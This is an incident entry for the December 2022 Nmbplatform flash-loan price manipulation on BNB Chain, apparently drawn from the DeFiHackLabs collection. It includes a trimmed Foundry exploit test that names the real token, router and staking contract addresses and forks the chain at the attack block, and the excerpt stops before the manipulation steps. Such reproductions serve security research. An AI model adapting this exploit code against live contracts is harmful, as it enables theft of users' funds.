# [?] - Nmbplatform - FlashLoan price manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Nmbplatform
Published: 2022-12-14
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Nmbplatform_exp.sol
Type: defi-exploit-poc

## Details
Lost: 76k
References:
- https://twitter.com/BlockSecTeam/status/1602877048124735489
- https://bscscan.com/tx/0x7d2d8d2cda2d81529e0e0af90c4bfb39b6e74fa363c60b031d719dd9d153b012
- https://bscscan.com/tx/0x42f56d3e86fb47e1edffa59222b33b73e7407d4b5bb05e23b83cb1771790f6c1

```solidity
contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);
    IERC20 NIMB = IERC20(0xCb492C701F7fe71bC9C4B703b84B0Da933fF26bB);
    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);
    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc);
    StakingRewardFixedAPY stakingReward1 = StakingRewardFixedAPY(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5);
    LockStakingRewardFixedAPY stakingReward2 = LockStakingRewardFixedAPY(0x706065716569f20971F9CF8c66D092824c284584);
    LockStakingRewardFixedAPY stakingReward3 = LockStakingRewardFixedAPY(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    uint256 flashLoanAmount;
    uint256 flashSwapAmount;
    User1 public user1;
    User2 public user2;
    User3 public user3;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_639_507);
    }

    function testExploit() public {
        user1 = new User1();
        user2 = new User2();
        user3 = new User3();
        NBU_WBNB.deposit{value: 20 ether}();
        NBU_WBNB.transfer(address(user1), 16 ether);
        NBU_WBNB.transfer(address(user2), 2 ether);
        NBU_WBNB.transfer(address(user3), 2 ether);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Nmbplatform_exp.sol_
